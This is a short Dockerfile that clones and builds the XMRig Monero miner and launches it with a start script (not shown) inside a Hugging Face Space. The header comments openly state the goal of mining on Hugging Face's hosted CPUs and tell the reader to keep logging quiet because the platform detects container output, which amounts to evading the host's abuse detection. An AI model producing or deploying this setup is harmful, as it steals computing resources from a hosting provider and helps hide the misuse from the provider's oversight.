# Monero Miner for Hugging Face Spaces
# Lightweight CPU mining using XMRig
# Hugging Face will detect container output, so keep logging quiet

FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl wget && \
    rm -rf /var/lib/apt/lists/*

# Build XMRig
RUN git clone https://github.com/xmrig/xmrig.git /xmrig && \
    mkdir /xmrig/build && \
    cd /xmrig/build && \
    cmake .. && \
    make -j$(nproc)

# Copy and run custom start script
COPY start.sh /start.sh
RUN chmod +x /start.sh

CMD ["/start.sh"]
